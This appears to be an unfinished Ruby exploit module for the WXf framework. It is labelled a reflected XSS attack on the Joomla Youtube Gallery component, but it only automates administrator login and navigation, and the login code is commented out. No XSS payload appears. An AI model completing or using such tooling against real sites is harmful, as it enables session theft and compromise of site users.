class WebXploit < WXf::WXfmod_Factory::Exploit
  include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'Youtube Gallery v2.2.7 Reflected XSS',
   'Version'     => '1.0',
   'Description' => %q{
 	Reflected XSS attack on Joomla Component, Youtube Gallery.
                    },
   'Author'      => [ 'John M. Poulin' ],
   'License'     => WXF_LICENSE
  )

  init_opts([
  	OptString.new('USER', [false, "Joomla Username", ""]),
	OptString.new('PASS', [false, "Joomla Password", ""]),
	OptString.new('COMPONENT', [false, "Component Name", "com_youtubegallery"]),
	OptString.new('ID', [false, "Gallery ID", ""]),
  ])

end

def exploit
	# Fetch the login page
	url = rurl + "/administrator/index.php"

	a = Mechanize.new
	login_page = a.get(url)

	# Login via the form
	result = login_page.form_with(:action => '/joomla/administrator/index.php') do |f|
		f.username = datahash['USER']
		f.passwd	= datahash['PASS']
	end.click_button

	## Click on yt_gallery link
	gallery_page = a.click(result.link_with(:uri => 'index.php?option=com_youtubegallery'))
	puts gallery_page.inspect

=begin
	# Look for cookie in body
	c_return = res.body.scan(/<input type\=\"hidden\" name\=\"return\" value=\"(.*)\" \/\>\n/m)
	c_hash = res.body.scan(/<input type\=\"hidden\" name\=\"([a-f0-9]{32})\" value=\"1\" \/\>/m)

	puts "Return: #{c_return}"
	puts "Hash: #{c_hash}"
	
	# Login Params
	params = "username=" + datahash['USER'] + "&passwd=" + datahash['PASS']
	params += "&option=com_login&task=login&return=#{c_return}&#{c_hash}=1"

	# Send Login Request
	res2 = mech_req({
            'method' => "POST",
            'RURL'=> url,
            'RPARAMS' => params,
	    'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
          })

puts res2.inspect
=end
end

end

